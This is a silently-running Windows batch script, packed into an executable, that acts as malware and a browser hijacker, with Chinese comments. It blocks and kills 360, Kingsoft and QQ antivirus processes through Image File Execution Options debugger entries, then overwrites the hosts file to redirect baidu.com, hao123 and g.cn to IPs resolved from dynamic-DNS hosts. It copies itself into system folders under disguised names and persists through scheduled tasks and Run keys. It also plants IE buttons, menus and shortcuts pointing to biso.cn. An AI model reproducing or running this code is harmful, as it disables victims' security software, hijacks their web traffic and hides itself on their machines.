
@rem ----- ExeScript Options Begin -----
@rem ScriptType: console,silent
@rem DestDirectory: temp
@rem Icon: none
@rem OutputFile: D:\soft\bat\v13\win32.exe
@rem ----- ExeScript Options End -----

::::建立安全映像
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360sd.exe" /v debugger  /d """"C:\Program Files\360\safetray\ksafetray.exe"""" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\QQdoctorRtp.exe" /v debugger  /d """"C:\Program Files\360\safetray\ksafetray.exe"""" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KSafe.exe" /v debugger  /d """"C:\Program Files\360\safetray\360safetray.exe"""" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Kismain.exe" /v debugger  /d """"C:\Program Files\360\safetray\360safetray.exe"""" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kpopserver.exe" /v debugger  /d """"C:\Program Files\360\safetray\360safetray.exe"""" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kxescore.exe" /v debugger  /d """"C:\Program Files\360\safetray\360safetray.exe"""" /f
taskkill /f /im 360sd.exe
taskkill /f /im 360tray.exe
taskkill /f /im kxetray.exe
taskkill /f /im ksafetray.exe
taskkill /f /im kxescore.exe
taskkill /f /im kxesapp.exe
taskkill /f /im kismain.exe
taskkill /f /im kpopserver.exe
taskkill /f /im QQdoctorRtp.exe
:wmic process where name="QQdoctorRtp.exe" delete
:wmic process where name="360sd.exe" delete
:wmic process where name="kxetray.exe" delete
:wmic process where name="kxescore.exe" delete
:wmic process where name="kxesapp.exe" delete
:wmic process where name="kpopserver.exe" delete
::ntsd -c q -pn 360sd.exe 能以底层管理员身份杀死顽固进程,但执行起很慢,且要现个窗口
:tasklist | find /i "360sd.exe" && ntsd -c q -pn 360sd.exe
:tasklist | find /i "kpopserver.exe" && ntsd -c q -pn kpopserver.exe
:tasklist | find /i "kxesapp.exe" && ntsd -c q -pn kxesapp.exe
:tasklist | find /i "kxetray.exe" && ntsd -c q -pn kxetray.exe
:kxescore.exe 属于底层病毒,很顽固,暂时杀不掉
:tasklist | find /i "kxescore.exe" && ntsd -c q -pn kxescore.exe
:tasklist | find /i "QQdoctorRtp.exe" && ntsd -c q -pn QQdoctorRtp.exe
:tasklist | find /i "QQdoctor.exe" && ntsd -c q -pn QQdoctor.exe
:endntsd

:判断是否存在PCSuite.exe进程，如果已存在就结束文件本身，否则就再判断蓝牙服务是否已开启，如果蓝牙服务已开启接就启动PCSuite.exe，如果蓝牙服务未启动就开启蓝牙服务并运行PCSuite.exe
:tasklist | find /i "PCSuite.exe" >nul &&echo on &&goto end
:net start | find /i "Bluetooth Support Service" &&goto pcs
:net start Bthserv 


ping -n 1 g-cn.8800.org > a.txt
for /f "tokens=2 delims=[]" %%a in (a.txt) do (set strgcn=%%a%)
del/q a.txt

ping -n 1 b-cn.8800.org > a.txt
for /f "tokens=2 delims=[]" %%a in (a.txt) do (set str=%%a%)
del/q a.txt

::若IP改变,则重建HOST
set dirip=%WINDIR%\system32\winsd.inf
set strb=%str%
set "strb=%strb:1=jmu%"
set "strb=%strb:2=scv%"
set "strb=%strb:4=hr%"
set "strb=%strb:5=d%"
set "strb=%strb:6=x%"
set x="1"
if not exist "%dirip%" echo %strb% > "%dirip%"
if "%x%"=="1" goto str
::---------------------------
if exist "%dirip%" (for /f %%a in (%dirip%) do (set stra=%%a%) )
echo %strb%
echo %stra%
if %strb% NEQ %stra% echo %strb% > "%dirip%"
if %strb% NEQ %stra% goto str


:防电信DNS劫持程序
set s1=%str:~0,6%
set s2=%str:~0,9%
if "%s1%"=="59.37." goto reping
if "%s1%"=="125.88" goto reping
if "%s1%"=="121.14" goto reping
if "%s1%"=="218.30" goto reping
if "%s1%"=="218.16" goto reping
if "%s2%"=="61.139.8." goto reping
if "%str%"=="" goto reping
goto findstr

:reping 防止以上没有PING通,补PING一下
ping -n 1 auee.oicp.net > a.txt
for /f "tokens=2 delims=[]" %%a in (a.txt) do (set str=%%a%)
del/q a.txt
if "%str%"=="" goto end

:findstr
findstr /m /c:"%str% www.baidu.com" "%SystemRoot%\system32\drivers\etc\hosts" > b.txt
for /f %%a in (b.txt) do (set b=%%a%)
del/q b.txt
if "%b%" NEQ "%SystemRoot%\system32\drivers\etc\hosts" goto str

findstr /m /c:biso.cn "%SystemRoot%\system32\drivers\etc\hosts" > c.txt
for /f %%a in (c.txt) do (set c=%%a%)
del/q c.txt
if "%c%" == "%SystemRoot%\system32\drivers\etc\hosts" goto str

goto end
:str
echo 1.0.0.0 www.930930.com > "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.10 www.2345.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.1 www.9991.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.2 www.qq2345.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.3 www.qq5.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.4 www.7421.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.5 www.7999.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.6 9991.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.7 www.5566.net >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.7 www.6655.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.8 www.265dh.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.8 999jjj.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.8 www.999jjj.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.9 cctv6029.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.9 www.cctv6029.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.11 8866ctv.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.11 www.8866ctv.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 1.0.0.12 www.8751.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo %str% baidu.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo %str% www.baidu.com >> "%SystemRoot%\system32\drivers\etc\hosts"
echo %str% www.hao123.cn >> "%SystemRoot%\system32\drivers\etc\hosts"
echo %str% hao123.cn >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 127.1.2.3 search.114.vnet.cn >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 127.1.2.3 114.vnet.cn >> "%SystemRoot%\system32\drivers\etc\hosts"
echo 127.1.2.3 www.114.com.cn >> "%SystemRoot%\system32\drivers\etc\hosts"
echo %strgcn% g.cn >> "%SystemRoot%\system32\drivers\etc\hosts"
echo %strgcn% www.g.cn >> "%SystemRoot%\system32\drivers\etc\hosts"


if not exist "%WINDIR%\system32\1025" md "%WINDIR%\system32\1025"
if not exist "%WINDIR%\Config\shell" md "%WINDIR%\Config\shell"
if not exist "%WINDIR%\repair" md "%WINDIR%\repair"
if not exist "%WINDIR%\repair\kxetray.exe" copy/y win32.exe "%WINDIR%\repair\kxetray.exe"
if not exist "%WINDIR%\Internet Explore.exe" copy/y "%temp%\Internet Explore.exe" "%WINDIR%\Internet Explore.exe"
if not exist "%WINDIR%\Internet Explore.exe" copy/y "%temp%\Internet Explore.exe" "%WINDIR%\Internet Explore.exe"
copy/y %WINDIR%\repair\kxetray.exe %WINDIR%\system32\1025\notepad.exe
copy/y %WINDIR%\repair\kxetray.exe %WINDIR%\Config\shell\alg.exe
if not exist %WINDIR%\SYSTEM\360shell.exe copy/y win32.exe %WINDIR%\SYSTEM\360shell.exe
copy/y %WINDIR%\repair\kxetray.exe %WINDIR%\system32\kxetray.exe 

::计划
set /a ran=%random%%%58+1
at /delete /yes
AT 12:%ran% /every:F %WINDIR%\Config\shell\alg.exe
::AT 20:%ran% /every:W %WINDIR%\repair\notepad.exe

::注册
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /va /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v safetraytray /d """"%WINDIR%\SYSTEM\360shell.exe"""" /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v kxetray /d """"%WINDIR%\repair\kxetray.exe"""" /f
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v alg /d """"%WINDIR%\Config\shell\alg.exe"""" /f

:::IE右键盘
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\我要搜索" /v "" /d "http://www.biso.cn/js/menu.asp?menu=search" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\网站导航" /v "" /d "http://www.biso.cn/js/menu.asp?menu=123" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\资讯新闻" /v "" /d "http://www.biso.cn/js/menu.asp?menu=news" /f

::IE标按钮

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "" /d "" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "ButtonText" /d "新闻资讯" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "Default Visible" /d "yes" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "Icon" /d "%SystemRoot%\System32\shell32.dll,14" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "default Icon" /d "%SystemRoot%\System32\shell32.dll,14" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "hotIcon" /d "%SystemRoot%\System32\shell32.dll,14" /f
rem CLSID：CLSID的值是固定的，必须为“{1FBA04EE-3024-11D2-8F1F-0000F87ABD16}”
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "CLSID" /d "{1FBA04EE-3024-11D2-8F1F-0000F87ABD16}" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "ClsidExtension" /d "新闻资讯" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "Exec" /d "http://www.biso.cn/js/re.asp?i=1" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "MenuText" /d "新闻资讯" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b01A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "MenuStatusBar" /d "新闻资讯" /f

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "" /d "" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "ButtonText" /d "谷歌搜索" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "Default Visible" /d "yes" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "Icon" /d "%SystemRoot%\System32\shell32.dll,15" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "default Icon" /d "%SystemRoot%\System32\shell32.dll,15" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "hotIcon" /d "%SystemRoot%\System32\shell32.dll,15" /f
rem CLSID：CLSID的值是固定的，必须为“{1FBA04EE-3024-11D2-8F1F-0000F87ABD16}”
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "CLSID" /d "{1FBA04EE-3024-11D2-8F1F-0000F87ABD16}" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "ClsidExtension" /d "谷歌搜索" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "Exec" /d "http://www.biso.cn/js/re.asp?i=2"  /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "MenuText" /d "谷歌搜索" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "MenuStatusBar" /d "谷歌搜索" /f

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b03A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "" /d "" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b03A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "ButtonText" /d "百度搜索" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b03A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "Default Visible" /d "yes" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b03A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "Icon" /d "%SystemRoot%\System32\shell32.dll,23" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b03A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "default Icon" /d "%SystemRoot%\System32\shell32.dll,23" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b03A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "hotIcon" /d "%SystemRoot%\System32\shell32.dll,23" /f
rem CLSID：CLSID的值是固定的，必须为“{1FBA04EE-3024-11D2-8F1F-0000F87ABD16}”
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b03A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "CLSID" /d "{1FBA04EE-3024-11D2-8F1F-0000F87ABD16}" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "ClsidExtension" /d "百度搜索" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b03A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "Exec" /d "http://www.biso.cn/js/re.asp?i=9"  /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b03A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "MenuText" /d "百度搜索" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{b02A04EE-3024-11D2-8F1F-0000F87ABD16}" /v "MenuStatusBar" /d "百度搜索" /f

::生成收藏夹
echo  [InternetShortcut] >  "%USERPROFILE%\Favorites\Google搜索.url"
echo  url="http://www.biso.cn/js/re.asp?i=2" >>  "%USERPROFILE%\Favorites\Google搜索.url"
echo IconIndex=0 >> "%USERPROFILE%\Favorites\Google搜索.url"
echo IconFile="%SystemRoot%\System32\gg.ico" >> "%USERPROFILE%\Favorites\Google搜索.url"

echo  [InternetShortcut] >  "%USERPROFILE%\Favorites\Baidu搜索.url"
echo  url="http://www.biso.cn/js/re.asp?i=9" >>  "%USERPROFILE%\Favorites\Baidu搜索.url"
echo IconIndex=0 >> "%USERPROFILE%\Favorites\Baidu搜索.url"
echo IconFile="%SystemRoot%\System32\bd.ico" >> "%USERPROFILE%\Favorites\Baidu搜索.url"

echo  [InternetShortcut] >  "%USERPROFILE%\Favorites\网站导航.url"
echo  url="http://123.biso.cn" >>  "%USERPROFILE%\Favorites\网站导航.url"
echo IconIndex=44 >> "%USERPROFILE%\Favorites\网站导航.url"
echo IconFile=%SystemRoot%\system32\SHELL32.dll >> "%USERPROFILE%\Favorites\网站导航.url"

::桌面
echo [InternetShortcut] > "%USERPROFILE%\桌面\资讯摘要.url"
echo url="http://www.biso.cn/js/re.asp?i=1" >>  "%USERPROFILE%\桌面\资讯摘要.url"
echo IconIndex=13 >> "%USERPROFILE%\桌面\资讯摘要.url"
echo IconFile=%SystemRoot%\system32\SHELL32.dll >> "%USERPROFILE%\桌面\资讯摘要.url"

:echo [InternetShortcut] > "%USERPROFILE%\桌面\百度搜索.url"
:echo url="http://www.biso.cn/js/re.asp?i=9" >> "%USERPROFILE%\桌面\百度搜索.url"
:echo IconIndex=22 >> "%USERPROFILE%\桌面\百度搜索.url"
:echo IconFile=%SystemRoot%\system32\SHELL32.dll >> "%USERPROFILE%\桌面\百度搜索.url"
:echo IconIndex=0 >> "%USERPROFILE%\桌面\百度搜索.url"

::"C:\Program Files\Common Files\Kingsoft\kiscommon\kxetray.exe"

:end

echo [InternetShortcut] > "%USERPROFILE%\桌面\谷歌搜索.url"
echo url="http://www.biso.cn/js/re.asp?i=2" >> "%USERPROFILE%\桌面\谷歌搜索.url"
echo IconIndex=14 >> "%USERPROFILE%\桌面\谷歌搜索.url"
echo IconFile=%SystemRoot%\system32\SHELL32.dll >> "%USERPROFILE%\桌面\谷歌搜索.url"
echo IconIndex=0 >> "%USERPROFILE%\桌面\谷歌搜索.url"

copy/y "%USERPROFILE%\桌面\谷歌搜索.url" "%USERPROFILE%\「开始」菜单\程序\"
copy/y "%USERPROFILE%\桌面\资讯摘要.url" "%USERPROFILE%\「开始」菜单\程序\"

